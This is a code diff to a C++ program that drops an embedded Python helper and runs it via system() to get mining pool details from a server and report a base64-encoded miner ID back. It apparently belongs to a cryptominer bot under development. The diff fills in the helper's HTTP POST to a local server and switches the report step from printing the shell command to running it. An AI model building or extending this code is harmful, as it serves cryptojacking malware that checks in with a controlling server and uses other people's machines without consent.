@@ -9,13 +9,14 @@
 #include <pwd.h>
 #include <sys/stat.h>
 #include "base64.h"
+#include "error.h"
 
 typedef struct pool_info{
     char * pool, *id;
 }pool_info;
 
 void drop_python_script(){
-    const char *script = R"(import urllib.request, json, time
+    const char *script = R"(import urllib.request, json, time, urllib3
 from sys import argv, exit
 #usage :
 #  python3 communication.py get_pool
@@ -33,7 +34,7 @@ def error():
 def offline():
     exit(-2)
 
-url = 'http://127.0.0.1'
+url = 'http://127.0.0.1:8000'
 arq = 'mining_pool_info_file.txt'
 
 def get_mining_pool_info():
@@ -53,9 +54,18 @@ def get_mining_pool_info():
     
     exit(0)
 
+
 # send msg to server
 def post(msg):
-    pass
+    encoded_body = msg 
+
+    http = urllib3.PoolManager()
+
+    r = http.request('POST', 'http://localhost:8000',
+                    headers={'Content-Type': 'text/html'},
+                    body=encoded_body)
+    returned_data = str(r.data)
+
 
 if __name__ == '__main__':
     if(len(argv) < 2):
@@ -85,9 +95,9 @@ pool_info* get_pool_info(){
     
     int ret = system(get_pool);
     if(ret != 0){
-        std::cout << "[-] Couldn't Get pool info, server possible be offline or no internet connection." << std::endl;
-        exit(-1);
+        Error::exit_error("[-] Couldn't Get pool info, server possible be offline or no internet connection.");
     }
+    
     pool_info *pool = (pool_info*) malloc(sizeof(pool_info));
     pool->id = (char *) malloc(sizeof(char) * 500);
     pool->pool =(char *) malloc(sizeof(char) * 500);
@@ -124,8 +134,7 @@ void new_miner(){
     std::string encoded = Base64::base64_encode(send);
     std::string x;
     const char * a = (x = std::string("python3 communication.py post ") += encoded).c_str();
-    //system(a);
-    std::cout << a << std::endl;
+    system(a);
 }
 
 
@@ -138,7 +147,7 @@ int main(int argc, char * argv[]){
     pool_info * pool = get_pool_info();
     std::cout << "Mining POOL: {id} = "<< pool->id << " {pool} = " << pool->pool << std::endl;
     
-    std::cout << "Sending to server miner ID ..." << std::endl;
+    std::cout << "Sending to server the miner ID ..." << std::endl;
     new_miner();
 
     //std::cout << "Starting thread to mine ..." << std::endl;
